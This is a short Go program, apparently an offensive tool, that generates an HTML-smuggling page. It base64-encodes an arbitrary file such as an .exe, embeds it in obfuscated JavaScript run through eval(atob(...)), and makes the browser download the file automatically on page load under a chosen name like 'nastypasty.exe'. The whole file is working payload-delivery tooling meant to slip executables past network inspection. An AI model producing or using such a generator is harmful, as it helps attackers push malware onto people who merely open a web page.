package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"strings"
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}
func base64encode(data []byte) string {
	return base64.StdEncoding.EncodeToString(data)
}
func stringToByte(data string) []byte {
	return []byte(data)
}
func mungeScript(fileContents string, outputName string) string {
	var js []string
	js = append(js, "var saveData=function(){var e=document.createElement('a');return document.body.appendChild(e),e.style='display: none',function(o,n){blob=new Blob([atob(o)],{type:'octet/stream'}),url=window.URL.createObjectURL(blob),e.href=url,e.download=n,window.navigator&&window.navigator.msSaveOrOpenBlob?window.navigator.msSaveOrOpenBlob(blob,n):(e.click(),window.URL.revokeObjectURL(url))}}();")
	js = append(js, "saveData('"+fileContents+"', '"+outputName+"')")
	return strings.Join(js, "")
}

func buildJS(filepath string, outputName string) string {
	file, err := ioutil.ReadFile(filepath)
	check(err)
	return base64encode(stringToByte(mungeScript(base64encode(file), outputName)))
}
func outputHTML(jsb64 string) string {
	var html []string
	html = append(html, "<html><head><title>this is evil run away</title></head><body>so much fudge</body><script>eval(atob('"+jsb64+"'))</script></html>")
	err := ioutil.WriteFile("output.html", stringToByte(strings.Join(html, "")), 0644)
	check(err)
	return "hi"
}

func main() {
	var sourceFile = flag.String("s", "test.exe", "Source File")
	var downloadFileName = flag.String("n", "nastypasty.exe", "Name of downloaded file")
	flag.Parse()
	fmt.Println(outputHTML(buildJS(*sourceFile, *downloadFileName)))
}
